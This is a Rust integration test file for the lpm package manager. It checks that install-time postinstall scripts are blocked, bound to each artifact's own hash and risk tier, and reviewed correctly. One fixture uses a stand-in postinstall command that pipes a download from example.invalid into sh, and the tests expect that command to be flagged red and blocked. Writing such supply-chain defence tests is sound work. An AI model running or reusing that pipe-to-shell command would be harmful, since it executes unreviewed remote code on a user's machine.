use super::*;
use crate::support::lpm_with_registry;
use crate::support::mock_registry::{MockRegistry, compute_integrity, make_tarball_from_pkg_json};
use serde_json::{Value, json};
use wiremock::{
    Mock, ResponseTemplate,
    matchers::{method, path},
};

async fn artifact_project() -> (TempProject, MockRegistry, [String; 2]) {
    let registry = MockRegistry::start().await;
    let mut integrities = Vec::new();
    for (route, script) in [
        ("/source-a.tgz", "node-gyp rebuild"),
        ("/source-b.tgz", "curl https://example.invalid/b | sh"),
    ] {
        let archive = make_tarball_from_pkg_json(
            json!({"name":"shared-addon","version":"1.0.0","scripts":{"postinstall":script}}),
            &[],
        );
        integrities.push(compute_integrity(&archive));
        Mock::given(method("GET"))
            .and(path(route))
            .respond_with(ResponseTemplate::new(200).set_body_bytes(archive))
            .mount(registry.server())
            .await;
    }
    Mock::given(method("GET")).and(path("/shared-addon")).respond_with(ResponseTemplate::new(200).set_body_json(json!({
        "name":"shared-addon", "time":{"1.0.0":"2020-01-01T00:00:00Z"}, "versions":{"1.0.0":{"name":"shared-addon","version":"1.0.0","dist":{"integrity":"sha512-unrelated-registry-artifact"},"_behavioralTags":{"hasNetworkAccess":true}}}
    }))).mount(registry.server()).await;
    let project = TempProject::empty(
        &json!({"name":"capture-host","version":"1.0.0","dependencies":{
        "source-a":format!("{}/source-a.tgz#{}",registry.url(),integrities[0]),
        "source-b":format!("{}/source-b.tgz#{}",registry.url(),integrities[1])
    },"lpm":{"scripts":{"denyAll":true}}})
        .to_string(),
    );
    project.write_file(".npmrc", &format!("registry={}/\n", registry.url()));
    let output = lpm_with_registry(&project, &registry.url())
        .env("LPM_STORE_VERSION", "v2")
        .args([
            "install",
            "--json",
            "--policy",
            "deny",
            "--no-security-summary",
            "--no-skills",
            "--no-editor-setup",
        ])
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    (project, registry, integrities.try_into().unwrap())
}

#[tokio::test]
async fn approval_capture_binds_each_artifact_to_its_own_scripts_and_tier() {
    let (project, registry, integrities) = artifact_project().await;
    let state: Value = serde_json::from_str(&project.read_file(".lpm/build-state.json")).unwrap();
    let rows = state["blocked_packages"].as_array().unwrap();
    assert_eq!(rows.len(), 2, "{state}");
    for ((alias, expected_tier), integrity) in [("source-a", "green"), ("source-b", "red")]
        .into_iter()
        .zip(&integrities)
    {
        let directory = project.path().join("node_modules").join(alias);
        let expected_hash = lpm_security::script_hash::compute_script_hash(&directory).unwrap();
        let row = rows
            .iter()
            .find(|row| row["integrity"] == *integrity)
            .unwrap();
        assert_eq!(
            row["script_hash"], expected_hash,
            "{alias} borrowed another artifact's script hash"
        );
        assert_eq!(
            row["static_tier"], expected_tier,
            "{alias} borrowed another artifact's tier"
        );
    }
    let listing = lpm_with_registry(&project, &registry.url())
        .env("LPM_STORE_VERSION", "v2")
        .args(["approve-scripts", "--list", "--json"])
        .output()
        .unwrap();
    assert!(listing.status.success());
    let blanket = lpm_with_registry(&project, &registry.url())
        .args(["approve-scripts", "--yes", "--dry-run", "--json"])
        .output()
        .unwrap();
    assert!(
        !blanket.status.success(),
        "red scripts cannot be bulk-approved"
    );
}

#[test]
fn approval_selectors_deduplicate_identical_authenticated_rows() {
    for selector in ["same", "same@1.0.0", "qualified"] {
        let project = TempProject::empty("{}");
        write_build_state_audit(
            &project,
            &[
                ("same", "1.0.0", "sha512-one", "sha256-script"),
                ("same", "1.0.0", "sha512-one", "sha256-script"),
            ],
        );
        let qualified = format!(
            "same@1.0.0#{}",
            lpm_common::artifact_binding_id(Some("sha512-one"), Some("sha256-script"))
        );
        let selector = if selector == "qualified" {
            qualified.as_str()
        } else {
            selector
        };
        let output = lpm(&project)
            .args(["approve-scripts", selector, "--dry-run", "--json"])
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{selector}: {}",
            String::from_utf8_lossy(&output.stdout)
        );
        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
        assert_eq!(report["approved_count"], 1);
    }
}

#[test]
fn approval_duplicate_rows_keep_the_strictest_tier() {
    let project = TempProject::empty("{}");
    write_build_state_audit(
        &project,
        &[
            ("same", "1.0.0", "sha512-one", "sha256-script"),
            ("same", "1.0.0", "sha512-one", "sha256-script"),
        ],
    );
    let mut state: Value =
        serde_json::from_str(&project.read_file(".lpm/build-state.json")).unwrap();
    state["blocked_packages"][1]["static_tier"] = json!("red");
    state["blocked_packages"][1]["binding_drift"] = json!(true);
    project.write_file(".lpm/build-state.json", &state.to_string());
    authenticate_project_build_state(&project);
    let listing = lpm(&project)
        .args(["approve-scripts", "--list", "--json"])
        .output()
        .unwrap();
    assert!(listing.status.success());
    let report: Value = serde_json::from_slice(&listing.stdout).unwrap();
    let rows = report["blocked"].as_array().unwrap();
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0]["static_tier"], "red");
    assert_eq!(rows[0]["binding_drift"], true);
}

#[test]
fn approval_accepts_bom_and_rejects_non_object_project_manifests() {
    for (manifest, success) in [("\u{feff}{}", true), ("null", false), ("[]", false)] {
        let project = TempProject::empty(manifest);
        write_build_state_audit(
            &project,
            &[("same", "1.0.0", "sha512-one", "sha256-script")],
        );
        let output = lpm(&project)
            .args(["approve-scripts", "--list", "--json"])
            .output()
            .unwrap();
        assert_eq!(
            output.status.success(),
            success,
            "input={manifest}: {}",
            String::from_utf8_lossy(&output.stdout)
        );
    }
}

#[test]
fn approval_rejects_non_object_project_manifests() {
    for manifest in ["null", "[]", "42"] {
        let project = TempProject::empty(manifest);
        write_build_state_audit(
            &project,
            &[("same", "1.0.0", "sha512-one", "sha256-script")],
        );
        let output = lpm(&project)
            .args(["approve-scripts", "--list", "--json"])
            .output()
            .unwrap();
        assert!(
            !output.status.success(),
            "input={manifest}: {}",
            String::from_utf8_lossy(&output.stdout)
        );
    }
}

#[test]
fn approval_diff_refuses_bodies_that_do_not_match_the_captured_hash() {
    let project = TempProject::empty("{}");
    let prior = seed_store_pkg_with_postinstall(&project, "shapeshift", "1.0.0", "echo before");
    let candidate =
        seed_store_pkg_with_postinstall(&project, "shapeshift", "2.0.0", "echo captured");
    let prior_hash = lpm_security::script_hash::compute_script_hash(&prior).unwrap();
    let candidate_hash = lpm_security::script_hash::compute_script_hash(&candidate).unwrap();
    write_project_with_prior_binding(&project, "shapeshift", "1.0.0", &prior_hash, None, None);
    write_blocked_build_state_with_drift(
        &project,
        "shapeshift",
        "2.0.0",
        &candidate_hash,
        None,
        None,
    );
    std::fs::write(
        candidate.join("package.json"),
        r#"{"scripts":{"postinstall":"echo substituted"}}"#,
    )
    .unwrap();
    let output = lpm(&project)
        .args(["approve-scripts", "--list"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let stdout = strip_ansi(&String::from_utf8_lossy(&output.stdout));
    assert!(
        !stdout.contains("+echo substituted"),
        "display borrowed uncaptured bytes: {stdout}"
    );
    assert!(
        stdout.contains("prior or candidate scripts not in store"),
        "{stdout}"
    );
}

#[tokio::test]
async fn auto_build_keeps_an_unexecuted_local_sibling_in_the_approval_queue() {
    let registry = MockRegistry::start().await;
    let project = TempProject::empty("{}");
    for (path, script) in [
        ("a", "echo built-a > built-a.txt"),
        ("b", "echo blocked-b > must-not-run.txt"),
    ] {
        project.write_file(
            &format!("packages/{path}/package.json"),
            &json!({"name":"shared-addon","version":"1.0.0","scripts":{"postinstall":script}})
                .to_string(),
        );
    }
    let approved_hash =
        lpm_security::script_hash::compute_script_hash(&project.path().join("packages/a")).unwrap();
    project.write_file("package.json", &json!({"name":"host","version":"1.0.0","dependencies":{"source-a":"file:./packages/a","source-b":"file:./packages/b"},"lpm":{"trustedDependencies":{"shared-addon@1.0.0":{"scriptHash":approved_hash}}}}).to_string());
    write_signed_unlock(&project, &["trust-bulk-approve"]);
    for _ in 0..2 {
        let output = lpm_with_registry(&project, &registry.url())
            .env("LPM_STORE_VERSION", "v2")
            .args([
                "install",
                "--auto-build",
                "--policy",
                "deny",
                "--json",
                "--no-security-summary",
                "--no-skills",
                "--no-editor-setup",
            ])
            .output()
            .unwrap();
        assert!(
            output.status.success(),
            "{}\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            project
                .path()
                .join("node_modules/source-a/built-a.txt")
                .exists()
        );
        assert!(
            !project
                .path()
                .join("node_modules/source-b/must-not-run.txt")
                .exists()
        );
        let state: Value =
            serde_json::from_str(&project.read_file(".lpm/build-state.json")).unwrap();
        let rows = state["blocked_packages"].as_array().unwrap();
        assert_eq!(rows.len(), 1, "an unexecuted sibling disappeared: {state}");
        let blocked_hash = lpm_security::script_hash::compute_script_hash(
            &project.path().join("node_modules/source-b"),
        )
        .unwrap();
        assert_eq!(rows[0]["script_hash"], blocked_hash);
    }
}

#[tokio::test]
async fn tarball_approval_does_not_borrow_registry_enrichment() {
    let (project, _, _) = artifact_project().await;
    let state: Value = serde_json::from_str(&project.read_file(".lpm/build-state.json")).unwrap();
    for row in state["blocked_packages"].as_array().unwrap() {
        assert!(
            row["published_at"].is_null(),
            "unrelated registry date attached: {row}"
        );
        assert!(
            row["behavioral_tags_hash"].is_null(),
            "unrelated registry tags attached: {row}"
        );
    }
}

#[cfg(unix)]
#[test]
fn approval_does_not_wait_on_a_fifo_project_manifest() {
    use std::time::{Duration, Instant};
    let project = TempProject::empty("{}");
    write_build_state_audit(
        &project,
        &[("same", "1.0.0", "sha512-one", "sha256-script")],
    );
    let manifest = project.path().join("package.json");
    std::fs::remove_file(&manifest).unwrap();
    assert!(
        std::process::Command::new("mkfifo")
            .arg(&manifest)
            .status()
            .unwrap()
            .success()
    );
    let mut child = crate::support::lpm_spawnable(&project)
        .args(["approve-scripts", "--list", "--json"])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .unwrap();
    let started = Instant::now();
    loop {
        if let Some(status) = child.try_wait().unwrap() {
            assert!(!status.success());
            break;
        }
        if started.elapsed() > Duration::from_secs(3) {
            child.kill().unwrap();
            child.wait().unwrap();
            panic!("approval blocked on a FIFO manifest");
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

#[tokio::test]
async fn artifact_qualified_approval_saves_the_selected_installed_hash() {
    let (project, registry, integrities) = artifact_project().await;
    registry.server().reset().await;
    let hash = lpm_security::script_hash::compute_script_hash(
        &project.path().join("node_modules/source-b"),
    )
    .unwrap();
    let selector = format!(
        "shared-addon@1.0.0#{}",
        lpm_common::artifact_binding_id(Some(&integrities[1]), Some(&hash))
    );
    write_signed_unlock(&project, &["trust-bulk-approve"]);
    let output = lpm_with_registry(&project, &registry.url())
        .args(["approve-scripts", &selector, "--json"])
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let manifest: Value = serde_json::from_str(&project.read_file("package.json")).unwrap();
    let bindings = manifest["lpm"]["trustedDependencies"].as_object().unwrap();
    assert_eq!(bindings.len(), 1);
    let binding = bindings.values().next().unwrap();
    assert_eq!(binding["integrity"], integrities[1]);
    assert_eq!(binding["scriptHash"], hash);
    let listing = lpm(&project)
        .args(["approve-scripts", "--list", "--json"])
        .output()
        .unwrap();
    let report: Value = serde_json::from_slice(&listing.stdout).unwrap();
    assert_eq!(report["blocked"].as_array().unwrap().len(), 1);
    assert_eq!(report["blocked"][0]["integrity"], integrities[0]);
}

#[tokio::test]
async fn offline_capture_keeps_local_archives_with_the_same_coordinates_distinct() {
    let registry = MockRegistry::start().await;
    let project=TempProject::empty(&json!({"name":"offline-host","version":"1.0.0","dependencies":{"source-a":"file:./a.tgz","source-b":"file:./b.tgz"},"lpm":{"scripts":{"denyAll":true}}}).to_string());
    for (file, script) in [("a.tgz", "echo a"), ("b.tgz", "echo b")] {
        let archive = make_tarball_from_pkg_json(
            json!({"name":"shared-addon","version":"1.0.0","scripts":{"postinstall":script}}),
            &[],
        );
        std::fs::write(project.path().join(file), archive).unwrap();
    }
    for offline in [false, true] {
        let mut command = lpm_with_registry(&project, &registry.url());
        command.env("LPM_STORE_VERSION", "v2").args([
            "install",
            "--policy",
            "deny",
            "--json",
            "--no-security-summary",
            "--no-skills",
            "--no-editor-setup",
        ]);
        if offline {
            command.arg("--offline");
            std::fs::remove_dir_all(project.path().join("node_modules")).unwrap();
        }
        let output = command.output().unwrap();
        assert!(
            output.status.success(),
            "{}\n{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        );
        let state: Value =
            serde_json::from_str(&project.read_file(".lpm/build-state.json")).unwrap();
        let rows = state["blocked_packages"].as_array().unwrap();
        assert_eq!(rows.len(), 2);
        for alias in ["source-a", "source-b"] {
            let hash = lpm_security::script_hash::compute_script_hash(
                &project.path().join("node_modules").join(alias),
            )
            .unwrap();
            assert_eq!(
                rows.iter().filter(|row| row["script_hash"] == hash).count(),
                1,
                "{state}"
            );
        }
    }
}

#[tokio::test]
async fn v1_review_displays_the_exact_local_source_scripts() {
    let registry = MockRegistry::start().await;
    let project = TempProject::empty(
        r#"{"name":"host","version":"1.0.0","dependencies":{"addon":"file:./local-addon"},"lpm":{"scripts":{"denyAll":true}}}"#,
    );
    project.write_file(
        "local-addon/package.json",
        r#"{"name":"addon","version":"2.0.0","scripts":{"postinstall":"echo current"}}"#,
    );
    let install = lpm_with_registry(&project, &registry.url())
        .env("LPM_STORE_VERSION", "v1")
        .args([
            "install",
            "--policy",
            "deny",
            "--json",
            "--no-security-summary",
            "--no-skills",
            "--no-editor-setup",
        ])
        .output()
        .unwrap();
    assert!(
        install.status.success(),
        "{} {}",
        String::from_utf8_lossy(&install.stdout),
        String::from_utf8_lossy(&install.stderr)
    );
    let prior = seed_store_pkg_with_postinstall(&project, "addon", "1.0.0", "echo prior");
    let prior_hash = lpm_security::script_hash::compute_script_hash(&prior).unwrap();
    write_project_with_prior_binding(&project, "addon", "1.0.0", &prior_hash, None, None);
    let output = lpm(&project)
        .env("LPM_STORE_VERSION", "v1")
        .args(["approve-scripts", "--list"])
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = strip_ansi(&String::from_utf8_lossy(&output.stdout));
    assert!(
        stdout.contains("+echo current"),
        "local source scripts were not displayed: {stdout}"
    );
}

#[test]
fn review_diff_finds_a_prior_artifact_in_multiple_virtual_store_contexts() {
    let project = TempProject::empty("{}");
    let integrity = compute_integrity(b"prior artifact");
    let store = lpm_store::v2::Store::at(project.home().join(".lpm/store/v2"));
    let object = store.paths().object_dir(&integrity).unwrap();
    std::fs::create_dir_all(&object).unwrap();
    let mut prior_hash = String::new();
    for suffix in ["aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb"] {
        let link = project
            .home()
            .join(format!(".lpm/store/v2/links/addon@1.0.0+{suffix}"));
        let directory = link.join("node_modules/addon");
        std::fs::create_dir_all(&directory).unwrap();
        let manifest =
            json!({"name":"addon","version":"1.0.0","scripts":{"postinstall":"echo prior"}});
        std::fs::write(directory.join("package.json"), manifest.to_string()).unwrap();
        std::fs::write(object.join("package.json"), manifest.to_string()).unwrap();
        std::fs::write(link.join(".lpm-link-meta.json"), json!({"schema":1,"graph_key":format!("addon@1.0.0+{suffix}"),"graph_key_digest_hex":suffix.repeat(4),"name":"addon","version":"1.0.0","source_sri":integrity,"object_path":"objects/fixture","deps":[],"platform":{"os":std::env::consts::OS,"cpu":std::env::consts::ARCH,"libc":null},"created_at":"2026-01-01T00:00:00Z","last_referenced_at":"2026-01-01T00:00:00Z"}).to_string()).unwrap();
        prior_hash = lpm_security::script_hash::compute_script_hash(&directory).unwrap();
    }
    let candidate = seed_store_pkg_with_postinstall(&project, "addon", "2.0.0", "echo current");
    let candidate_hash = lpm_security::script_hash::compute_script_hash(&candidate).unwrap();
    write_project_with_prior_binding(&project, "addon", "1.0.0", &prior_hash, None, None);
    let mut manifest: Value = serde_json::from_str(&project.read_file("package.json")).unwrap();
    manifest["lpm"]["trustedDependencies"]["addon@1.0.0"]["integrity"] = json!(integrity);
    project.write_file("package.json", &manifest.to_string());
    write_blocked_build_state_with_drift(&project, "addon", "2.0.0", &candidate_hash, None, None);
    let output = lpm(&project)
        .args(["approve-scripts", "--list"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let stdout = strip_ansi(&String::from_utf8_lossy(&output.stdout));
    assert!(
        stdout.contains("-echo prior"),
        "available prior scripts missing: {stdout}"
    );
    assert!(stdout.contains("+echo current"), "{stdout}");
}
